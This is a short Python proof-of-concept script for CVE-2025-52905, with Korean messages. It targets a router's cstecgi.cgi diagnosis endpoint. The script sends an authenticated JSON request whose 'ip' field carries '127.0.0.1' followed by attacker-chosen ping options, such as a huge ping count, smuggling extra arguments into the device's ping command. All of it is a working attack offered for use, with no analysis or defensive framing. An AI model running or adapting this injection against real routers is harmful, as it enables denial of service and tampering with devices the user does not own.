#!/usr/bin/env python3
import requests
import argparse
import json

def exploit(target_ip, token, malicious_options):
    target_url = f"http://{target_ip}/cgi-bin/cstecgi.cgi?token={token}"
    
    headers = {"Content-Type": "application/json"}
    
    data = {
        "topicurl": "setDiagnosisCfg",
        "ip": f"127.0.0.1 {malicious_options}",
        "num": "1"
    }
    
    response = requests.post(target_url, headers=headers, 
                           data=json.dumps(data), timeout=10)
    
    if response.status_code == 200:
        print("[+] 공격 성공!")
        print(f"[*] 옵션 '{malicious_options}' 주입 완료")
    else:
        print(f"[-] 공격 실패: {response.text}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="CVE-2025-52905 PoC")
    parser.add_argument("target_ip", help="타겟 라우터 IP")
    parser.add_argument("token", help="인증 토큰")
    parser.add_argument("options", help="주입할 ping 옵션 (예: -c 99999999)")
    args = parser.parse_args()
    
    exploit(args.target_ip, args.token, args.options)